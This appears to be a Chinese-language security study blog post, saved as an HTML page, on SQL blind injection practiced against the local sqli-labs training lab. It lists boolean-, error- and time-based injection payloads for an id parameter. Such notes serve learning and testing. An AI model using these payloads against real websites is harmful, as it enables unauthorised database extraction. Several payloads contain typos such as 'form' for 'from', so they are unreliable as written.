@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>sql盲注 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="SQL注入的基础1.当在浏览器输入id值时，sql的语句会变成select …..from users where id&#x3D;……LIMIT0,1例：http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1会自动转化为select ….from users where id&#x3D;’1’ LIMIT0,1注意：（1）–+或#起注释作用，会将后面的所有语句删除掉      （2）unio">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql盲注">
+<meta property="og:url" content="http://example.com/2021/07/17/sql%E7%9B%B2%E6%B3%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SQL注入的基础1.当在浏览器输入id值时，sql的语句会变成select …..from users where id&#x3D;……LIMIT0,1例：http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1会自动转化为select ….from users where id&#x3D;’1’ LIMIT0,1注意：（1）–+或#起注释作用，会将后面的所有语句删除掉      （2）unio">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-07-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-07-16T07:22:55.320Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/http/" style="font-size: 10px;">http</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 16px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 14px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 18px;">脚本编写</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-sql盲注" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/sql%E7%9B%B2%E6%B3%A8/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql盲注
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入的基础"><a href="#SQL注入的基础" class="headerlink" title="SQL注入的基础"></a>SQL注入的基础</h1><p>1.当在浏览器输入id值时，sql的语句会变成select …..from users where id=……LIMIT0,1<br>例：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-1/?id=1%E4%BC%9A%E8%87%AA%E5%8A%A8%E8%BD%AC%E5%8C%96%E4%B8%BAselect">http://127.0.0.1/sqli-labs/Less-1/?id=1会自动转化为select</a> ….from users where id=’1’ LIMIT0,1<br>注意：（1）–+或#起注释作用，会将后面的所有语句删除掉<br>      （2）union的作用连接sql语句，若前一条语句为空，则显示后面语句，反之，则<br>           示前面一条语句<br>      （3）注入类型：id=’$id‘  id=$id   id=(‘$id’)   id=(“$id”)……<br>           闭合中的数字后面跟与类型无关的字符，将默认转换为前面的数字</p>
+<h1 id="sql布尔盲注"><a href="#sql布尔盲注" class="headerlink" title="sql布尔盲注"></a>sql布尔盲注</h1><h2 id="基本使用函数"><a href="#基本使用函数" class="headerlink" title="基本使用函数"></a>基本使用函数</h2><ol>
+<li>Mid（）函数<br>此函数为截取字符串一部分，使用形式：Mid(column_name,start[,length])</li>
+<li>substr()函数<br>Substr()和substring()函数实现的功能是一样的，均为截取字符串。使用形式如下：<br>string substring(string, start, length)<br>string substr(string, start, length)<br>注意：参数描述同mid()函数，string为第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</li>
+<li>Left()函数<br>Left()得到字符串左部指定个数的字符，使用形式：Left ( string, n )<br>string为要截取的字符串，n为长度</li>
+<li>ORD（）函数，此函数为返回的第一个字符串的ascii码<br>如：ORD(MID(DATABASE(),1,1))&gt;114意为检测database（）第一位ascii码<br>否大于114，也即是“r”</li>
+<li>ascii()函数<br>将某个字符转换为ascii码，与ORD函数相似</li>
+<li>regexp 正则注入<br>正则注入介绍：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5717442.html">http://www.cnblogs.com/lcamry/articles/5717442.html</a><br>用法介绍：select user() regexp ‘^[a-z]’;<br>Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。<br>第二位可以用 select user() regexp ‘^ro’来进行。</li>
+<li>like匹配注入<br>和regexp正则注入类似，mysql注入的时候我们可以用like进行匹配<br>用法：select user() like ‘ro%’</li>
+<li>sleep()函数<br>将程序挂起一段时间 ，n为n秒</li>
+<li>if（）语句<br> 判断语句，如果第一个语句正确就执行第二个语句，如果错误就执行第三个语句</li>
+<li>length(string)<br>字符串的长度，string为要处理的字符串</li>
+<li>database()是数据库，table()是数据表</li>
+<li>CAST(str AS 目标数据类型）<pre><code>    将目标str转化为目标数据类型
+</code></pre>
+</li>
+<li>IFNULL(expr1,expr2)<pre><code>    如果expr1不是null,IFNULL()返回expr1,否则它返回的是expr2，且0x20为空
+</code></pre>
+</li>
+</ol>
+<h2 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h2><ol>
+<li>先爆数据库，如：<br>?id=1’and length(database()) –+    看当前数据库的长度<br>?id=1’and left(database(),1) –+    看当前数据库第一个首字母</li>
+<li>再爆数据表，如：<br>?id=1’and ascii(substr((select table_name for information_schema.tables where tables_schema=database() LIMIT    0,1),1,1))=(&lt;或&gt;)113 –+<br>以此类推，得出所有表</li>
+<li>再判断表中的列名是否有….列,如：<br>?Id=1’and 1=(select 1 from information_schema.columns where table_name=’users’and column_name regexp   ‘^username’LIMIT 0,1) –+</li>
+<li>看表中的列的内容，如；<br>?Id=1’and ORD(MID((select IFNULL(CAST(username AS CHAR),0x20）form security.users order by ip LIMIT       0,1),1,1))=68 –+<br>_</li>
+</ol>
+<h1 id="基于报错的sql盲注"><a href="#基于报错的sql盲注" class="headerlink" title="基于报错的sql盲注"></a>基于报错的sql盲注</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Count----------------------用于计数</span><br><span class="line">Floor----------------------取得0或1，进行数据的重复</span><br><span class="line">Group by-------------------对相同数据进行分组（相同的一组）</span><br><span class="line">Rand()---------------------一个随机函数，但使用一个固定的随机数种子0后，成为固定的伪随机序列</span><br><span class="line">extractvalue（1，路径）-------------如果路径格式不正确，就会返回报错信息，如果此时输入恶意代码，则返回想要的数据</span><br><span class="line">updatexml(1,路径,1)-----------------如果路径的格式不正确，就会返回报错信息，如果此时输入恶意代码，则返回想要的数据</span><br><span class="line">exp()--------------如果里面的数据超过720，则会有溢出，并返回想要的信息</span><br></pre></td></tr></table></figure>
+
+<h2 id="报错类型"><a href="#报错类型" class="headerlink" title="报错类型"></a>报错类型</h2><ol>
+<li>平常报错注入<br>  ?id=1’union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,floor(rand(0)*2))a form      information_schema.columns group by a–+</li>
+<li>利用double数值类型超出范围进行报错注入<br>  ?Id=1’union select (exp(~(select * from(select user())a))),2,3 –+</li>
+<li>利用bigint溢出进行报错注入<br>  ?Id=1’union select (!(select * from(select user())x) - ~0),2,3 –+</li>
+<li>xpath函数报错注入<br>  ?Id=1’and extractvalue(1,concat(0x7e,(select @@version),0x7e)) –+<br>  ?Id=1’and updatexml(1,concat(0x7e,(select @@verson),0x7e),1) –+</li>
+<li>利用数据重复性报错注入<br>  ?Id=1’union select 1,2,3 from (select NAME CONST(version(),1),NAME CONST(version(),1))x –+</li>
+</ol>
+<h1 id="基于时间的sql盲注"><a href="#基于时间的sql盲注" class="headerlink" title="基于时间的sql盲注"></a>基于时间的sql盲注</h1><h2 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Sleep(N)-------------可以让语句运行N秒</span><br><span class="line">Benchmark()-----------一个mysql的内置函数，主要用来测试一些函数执行速度，且带有两个参数，一个为执行次数，一个是执行函数或表达式</span><br></pre></td></tr></table></figure>
+
+<h2 id="延时注入类型"><a href="#延时注入类型" class="headerlink" title="延时注入类型"></a>延时注入类型</h2><ol>
+<li>利用sleep()函数进行注入<br>?Id=1’and if(ascii(substr(database(),1,1))=115,1,sleep(5)) –+</li>
+<li>利用benchmark()进行延时注入<br>?Id=1’union select (if(subsring(current,1,1)=char(115),benchmark(50000,encode(‘MSG’,’by 5      seconds       ’)),null)),2,3 from(select database() as current) as tb1 –+</li>
+</ol>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/07/17/sql%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          sql延时注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/07/17/web_AliceWebsite%EF%BC%88%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E7%AC%AC%E4%BA%8C%E9%A2%98%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">web_AliceWebsite</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="sql盲注" data-title="sql盲注" data-url="http://example.com/2021/07/17/sql%E7%9B%B2%E6%B3%A8/"  data-images="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" data-content="sql盲注">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
